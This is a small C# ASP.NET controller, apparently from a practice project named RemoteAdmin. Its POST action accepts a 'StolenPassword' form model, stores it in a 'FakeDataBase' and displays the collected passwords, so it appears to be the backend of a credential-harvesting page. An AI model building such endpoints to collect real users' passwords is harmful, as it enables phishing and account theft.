using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Linq;
using System.Threading.Tasks;
using Microsoft.AspNetCore.Mvc;
using Microsoft.Extensions.Logging;
using RemoteAdmin.Models;

namespace RemoteAdmin.Controllers
{
    public class HomeController : Controller
    {


        [HttpGet]
        public ViewResult Index()
        {
            return View("Index");
        }

        [HttpPost]
        public ViewResult Index(StolenPassword pass)
        {
            FakeDataBase.AddPassword(pass);
            FakeDataBase.GetDump(pass);

            using(var fb = new FakeDataBase())
            {
                fb.Add(pass);
                fb.SaveChanges();
            }

            return View("ShowPassword", FakeDataBase.GetPasswords);
        }

        
       

      

    }
}
